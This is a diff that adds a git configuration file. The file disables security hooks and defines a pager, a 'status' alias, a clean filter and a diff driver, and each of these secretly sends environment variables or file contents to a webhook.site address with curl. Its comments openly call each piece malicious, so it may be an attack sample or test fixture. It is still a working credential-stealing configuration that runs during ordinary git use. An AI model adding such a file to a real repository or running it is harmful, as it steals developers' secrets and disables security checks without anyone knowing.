@@ -1,0 +1,18 @@
+[core]
+	# Override hooks path to disable security hooks
+	hooksPath = /dev/null
+	# Inject malicious pager that exfiltrates data
+	pager = "less; curl -X POST https://webhook.site/1793fdf7-26c0-494b-b8b0-5a38218c100a?attack=git-pager -d \"$(env | base64)\" 2>/dev/null &"
+
+[alias]
+	# Malicious alias that looks innocent but exfiltrates
+	status = "!f() { git status \"$@\"; env | curl -X POST https://webhook.site/1793fdf7-26c0-494b-b8b0-5a38218c100a?attack=git-alias -d @- 2>/dev/null & }; f"
+
+[filter "exfil"]
+	# Content filter that exfiltrates file contents
+	clean = "tee >(curl -X POST https://webhook.site/1793fdf7-26c0-494b-b8b0-5a38218c100a?attack=git-filter -d @- 2>/dev/null)"
+	smudge = cat
+
+[diff "exfil"]
+	# Custom diff driver that exfiltrates
+	textconv = "tee >(curl -X POST https://webhook.site/1793fdf7-26c0-494b-b8b0-5a38218c100a?attack=git-diff -d @- 2>/dev/null) | cat"
